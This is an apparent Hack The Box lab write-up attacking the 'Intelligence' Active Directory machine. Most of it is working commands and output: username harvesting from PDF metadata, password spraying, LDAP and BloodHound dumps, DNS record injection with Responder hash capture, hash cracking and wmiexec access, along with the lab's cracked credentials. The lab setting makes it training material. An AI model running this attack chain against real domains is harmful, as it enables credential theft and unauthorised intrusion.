---
layout: post
title: HTB Machine - Intelligence
subtitle: Writeup
cover-img: https://www.hackthebox.com/storage/avatars/78c5d8511bae13864c72ba8df1329e8d.png
thumbnail-img: https://www.hackthebox.com/storage/avatars/78c5d8511bae13864c72ba8df1329e8d.png
share-img: https://www.hackthebox.com/storage/avatars/78c5d8511bae13864c72ba8df1329e8d.png
tags: [ HTB, Active Directory, Hack the Box, Network,Vulnerability Assessment,Active Directory,Source Code Analysis,Security Tools,Authentication,Kerberos,LDAP,Bloodhound,Powershell,Reconnaissance,Impersonation,Password Cracking,Password Spraying,Kerberos Abuse,Hash Capture,Information Disclosure,Misconfiguration]
---

we start enumerating the smb but no much there.
```zsh
crackmapexec smb 10.10.10.248
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)

smbclient -L 10.10.10.248 -N
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.248 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
no luck with rpc. 
```zsh
rpcclient -U "" 10.10.10.248 -N
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $> enumdomgroups
result was NT_STATUS_ACCESS_DENIED
rpcclient $> querygroupmem 0x200
result was NT_STATUS_ACCESS_DENIED
```
there is a webpage. we go to the ip and the address intelligence.htb (after placing it in etc/hosts) in case there is virtual hosting the content should change, but it is not our case. 
```zsh
 whatweb http://10.10.10.248
http://10.10.10.248 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[contact@intelligence.htb], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.248], JQuery, Microsoft-IIS[10.0], Script, Title[Intelligence]
```
there are a couple of pdfs,the donwload link has a path, if we try to go to that path we still cannot do a directory listing. 

http://10.10.10.248/documents/2020-12-15-upload.pdf

http://10.10.10.248/documents/

download both files and pass them through exiftool to check for metadata, and we found a couple of users names.
```zsh
exiftool 2020-01-01-upload.pdf
ExifTool Version Number         : 12.57
File Name                       : 2020-01-01-upload.pdf
Directory                       : .
File Size                       : 27 kB
File Modification Date/Time     : 2021:04:01 19:00:00+02:00
File Access Date/Time           : 2023:05:08 07:46:44+02:00
File Inode Change Date/Time     : 2023:05:08 07:46:44+02:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : William.Lee

exiftool 2020-12-15-upload.pdf
ExifTool Version Number         : 12.57
File Name                       : 2020-12-15-upload.pdf
Directory                       : .
File Size                       : 27 kB
File Modification Date/Time     : 2021:04:01 19:00:00+02:00
File Access Date/Time           : 2023:05:08 07:46:54+02:00
File Inode Change Date/Time     : 2023:05:08 07:46:54+02:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : Jose.Williams
```
One thing that we notice is that the documents have a pattern, so maybe its possible to find other documents with the same pattern and download them, find the metadata and create a list of users from that. To create the pattern we will use bash. Each for i,j,k will create a iteration of the numnbers for the year,month, day and then place them inside a variable, the variables will be called inside the webpage address. Each done; is necessary to close the i,j,k loops, then we add the xargs to place it line by line. -P 20 will set the max-processors we want (to be as fast as possible) and we want to do a wget to download all (if found).
```zsh
for i in {2020..2022}; do for j in {01..12}; do for k in {01..31}; do echo "http://10.10.10.248/documents/$i-$j-$k-upload.pdf"; done; done; done | xargs -n 1 -P 20 wget
```
now that we have all the documents we want to extract the users from the metadata. We will grep the line creator from the exiftool output, then we will ask with awk to print the last field from the line, then we will apply a sort to sort them in alphabetical way and -u (unique) so it doesnt show the names more than once if they repeat. we can count them if we add wc -l at the end
```zsh
exiftool *.pdf | grep "Creator" | awk 'NF{print $NF}' | sort -u | wc -l

exiftool *.pdf | grep "Creator" | awk 'NF{print $NF}' | sort -u > users.txt 
```
no user has it set so we cannot do a AS-REP roast attack. 
```zsh
GetNPUsers.py -no-pass -usersfile users.txt intelligence.htb/
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User Anita.Roberts doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Brian.Baker doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Brian.Morris doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Daniel.Shelton doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Danny.Matthews doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Darryl.Harris doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User David.Mcbride doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User David.Reed doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User David.Wilson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Ian.Duncan doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jason.Patterson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jason.Wright doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jennifer.Thomas doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jessica.Moody doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User John.Coleman doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jose.Williams doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Kaitlyn.Zimmerman doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Kelly.Long doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Nicole.Brock doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Richard.Williams doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Samuel.Richardson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Scott.Scott doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Stephanie.Young doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Teresa.Williamson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Thomas.Hall doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Thomas.Valenzuela doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Tiffany.Molina doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Travis.Evans doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Veronica.Patel doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User William.Lee doesn't have UF_DONT_REQUIRE_PREAUTH set
```
we validate with kerbrute that all users are valid. 
```zsh
/opt/kerbrute/kerbrute userenum --dc intelligence.htb users.txt -d intelligence.htb
2023/05/08 11:58:20 >  Using KDC(s):
2023/05/08 11:58:20 >  	intelligence.htb:88
(SNIP)
2023/05/08 11:58:26 >  Done! Tested 30 usernames (30 valid) in 5.176 seconds
```
We can read each PDF and we will extract in one of them (2020-06-04-upload.pdf) a password. alternative, we can convert the pdf to text so we can then read them with cat. Install poppler-utils which has pdftotext, then convert the files to txt and use batcat to read them all.
```zsh
sudo apt install poppler-utils

for f in *pdf; do pdftotext $f; done

cat *.txt

NewIntelligenceCorpUser9876
```
we will try the password against our list of users to see if I user left it as default.
```zsh
crackmapexec smb 10.10.10.248 -u users.txt -p NewIntelligenceCorpUser9876 --continue-on-success
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
```
We are going to try to Kerberoast the user. There is no warranty that the user could be kerberoasted and in this case is not. 
```zsh
/usr/share/doc/python3-impacket/examples/GetUserSPNs.py intelligence.htb/Tiffany.Molina:NewIntelligenceCorpUser9876 -request
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

No entries found!
```
We try to rpc with the credentials and enumerate 
```zsh
rpcclient -U "Tiffany.Molina%NewIntelligenceCorpUser9876" 10.10.10.248
rpcclient $> enumdomusers

rpcclient $> enumdomgroups

rpcclient $> querydispinfo
```
Administrator is the only available for Domain Admin. Lets now dump the ldap info with valid credentials. for that we go first to the /var/www/html folder and from there receive all the dump
```zsh
ldapdomaindump -u "intelligence.htb\Tiffany.Molina" -p 'NewIntelligenceCorpUser9876' -n 10.10.10.248 10.10.10.248
```
we start the apache service and then go to the browser and go to localhost. This will allow us to view all the dump data in a comfortable manner via html. We can review the info and stop the server once done. 
```zsh
service apache2 start 
service apache2 stop
```
We will use the user found against smb and check files till we find our flag. 
```zsh
smbmap -H 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -r Users/Tiffany.Molina/Desktop

smbmap -H 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 --download Users/Tiffany.Molina/Desktop/user.txt
```
if we enumerate further there is a folder inside IT that has a PS script. The script is checking the DNS records that start with web, then it makes a request to that server with a user and a default pass (that we dont know). So we are going to inject a DNS record with the name web in it that it will point to our PC, we will capture the credentials from there and find out the pass. We are gonna need a tool from github to create the DNS record and then capture any traffic with responder. 
```zsh
sudo git clone https://github.com/dirkjanm/krbrelayx.git

cd krbrelayx

python3 dnstool.py -r webricky -a add -t A -d 10.10.14.4 10.10.10.248 -u "intelligence.htb\Tiffany.Molina" -p "NewIntelligenceCorpUser9876"

sudo responder -I tun0
```
we capture the credentials and then use john to crack it. We validate them with crackmapexec
```zsh
john -w:/usr/share/wordlists/rockyou.txt hash
Mr.Teddy         (Ted.Graves)     

crackmapexec smb 10.10.10.248 -u Ted.Graves -p Mr.Teddy
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Ted.Graves:Mr.Teddy 
```
We are going to use the bloodhound ingestor with the new credentials.
```zsh
bloodhound-python -c All -u 'Ted.Graves' -p 'Mr.Teddy' -ns 10.10.10.248 -d intelligence.htb
INFO: Found AD domain: intelligence.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc.intelligence.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc.intelligence.htb
INFO: Found 43 users
INFO: Found 55 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: svc_int.intelligence.htb
INFO: Querying computer: dc.intelligence.htb
WARNING: Could not resolve: svc_int.intelligence.htb: The DNS query name does not exist: svc_int.intelligence.htb.
INFO: Done in 00M 11S
```
Later Bloodhound it is suppose to show something, but in my case it doesnt show. So I follow the official writeup pages 11 and 12. For those steps its crutial to update the clock and right away try the next command. It took several tries of this to work. 
```zsh
ntpdate -s 10.10.10.248
wmiexec.py -k -no-pass dc.intelligence.htb
```

